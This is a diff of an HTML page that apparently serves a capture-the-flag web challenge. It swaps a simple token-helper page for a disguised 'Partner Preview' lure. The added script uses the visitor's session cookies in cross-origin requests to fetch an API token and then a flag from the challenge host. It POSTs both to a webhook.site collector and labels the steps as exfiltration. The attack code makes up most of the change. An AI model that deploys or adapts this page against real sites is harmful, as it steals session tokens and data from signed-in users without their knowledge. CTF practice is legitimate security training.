@@ -1,84 +1,61 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <title>PointerOverflow CTF - Token Fetcher</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <style>
-    body { font-family: system-ui, sans-serif; margin: 2rem; }
-    h1 { color: #2a7ae2; }
-    button { font-size: 1rem; padding: 0.5rem 1rem; margin-top: 1rem; }
-    p { margin-top: 1rem; }
-    input { width: 100%; padding: 0.5rem; margin-top: 0.5rem; }
-  </style>
+    <title>Partner Preview Integration</title>
 </head>
 <body>
-  <h1>PointerOverflow CTF - Token Fetcher</h1>
+    <h1>Palantir Partner Preview (CTF Demo)</h1>
+    <p>Click below to load the community accounts preview. Ensure you're signed in on the target tab.</p>
+    <button onclick="loadPreview()">Load Secure Preview</button>
+    <iframe id="targetFrame" style="display:none;" sandbox="allow-scripts allow-same-origin"></iframe>
+    <script>
+        async function loadPreview() {
+            // Embed target in iframe (shares cookies if same-site, but we use CORS for fetch)
+            const frame = document.getElementById('targetFrame');
+            frame.src = 'https://web200-1.pointeroverflowctf.com/';  // Loads main page, sets session if authenticated
 
-  <button id="loginBtn">Login</button>
-  <button id="tokenBtn" disabled>Fetch Token</button>
+            // Wait a bit for load (adjust if needed)
+            setTimeout(async () => {
+                try {
+                    // Step 1: Cross-origin fetch for session-scoped token (assumes endpoint like /api/token leaks it)
+                    // Replace /api/token with actual endpoint if different (inspect target network tab after sign-in)
+                    const tokenRes = await fetch('https://web200-1.pointeroverflowctf.com/api/token', {
+                        method: 'GET',
+                        credentials: 'include',  // Sends cookies for auth
+                        mode: 'cors'  // Triggers CORS, trusted since origin is github.io
+                    });
+                    if (!tokenRes.ok) throw new Error('Token fetch failed');
+                    const tokenData = await tokenRes.json();
+                    const apiToken = tokenData.token;  // Assume response: { "token": "session_token_here" }
+                    console.log('Exfiltrated Token:', apiToken);
 
-  <p id="status"></p>
+                    // Step 2: Use token to fetch flag
+                    const flagRes = await fetch('https://web200-1.pointeroverflowctf.com/api/flag', {
+                        method: 'GET',
+                        headers: {
+                            'Authorization': `Bearer ${apiToken}`,  // Or whatever auth the token uses (e.g., X-API-Token)
+                            'X-Flag-Token': apiToken  // As per challenge: Send using X-Flag-Token
+                        },
+                        credentials: 'include',
+                        mode: 'cors'
+                    });
+                    if (!flagRes.ok) throw new Error('Flag fetch failed');
+                    const flagData = await flagRes.text();  // Assume flag is plain text or JSON
+                    console.log('Flag:', flagData);
 
-  <label for="tokenInput">Your Token:</label>
-  <input type="text" id="tokenInput" readonly>
+                    // Step 3: Exfiltrate (log + send to your server for capture)
+                    fetch('https://webhook.site/your-unique-id', {  // Replace with your webhook.site URL
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ token: apiToken, flag: flagData })
+                    });
 
-  <p>Once you have your token, open a new tab to <code>/api/flag</code> and paste the token in the console:</p>
-  <pre>
-fetch(location.href, {
-  headers: { "X-Flag-Token": "PASTE_YOUR_TOKEN_HERE" },
-  credentials: "include"
-}).then(r => r.text()).then(console.log)
-  </pre>
-
-  <script>
-    const loginBtn = document.getElementById('loginBtn');
-    const tokenBtn = document.getElementById('tokenBtn');
-    const statusEl = document.getElementById('status');
-    const tokenInput = document.getElementById('tokenInput');
-
-    const log = (msg) => {
-      console.log(msg);
-      statusEl.textContent = msg;
-    };
-
-    loginBtn.onclick = async () => {
-      loginBtn.disabled = true;
-      log("Logging in...");
-
-      const res = await fetch('https://web200-1.pointeroverflowctf.com/login', {
-        method: 'POST',
-        credentials: 'include'
-      });
-
-      if (!res.ok) {
-        log("Login failed!");
-        loginBtn.disabled = false;
-        return;
-      }
-
-      log("Login successful. Session cookie set.");
-      tokenBtn.disabled = false;
-    };
-
-    tokenBtn.onclick = async () => {
-      tokenBtn.disabled = true;
-      log("Fetching token...");
-
-      const res = await fetch('https://web200-1.pointeroverflowctf.com/api/token', {
-        credentials: 'include'
-      });
-
-      if (!res.ok) {
-        log("Failed to fetch token!");
-        tokenBtn.disabled = false;
-        return;
-      }
-
-      const data = await res.json();
-      tokenInput.value = data.apiToken;
-      log("Token fetched! Copy it to use on /api/flag.");
-    };
-  </script>
+                } catch (err) {
+                    console.error('Error:', err);
+                    // Fallback: If /api/token doesn't exist, inspect for other endpoints (e.g., /api/user)
+                }
+            }, 2000);
+        }
+    </script>
 </body>
 </html>
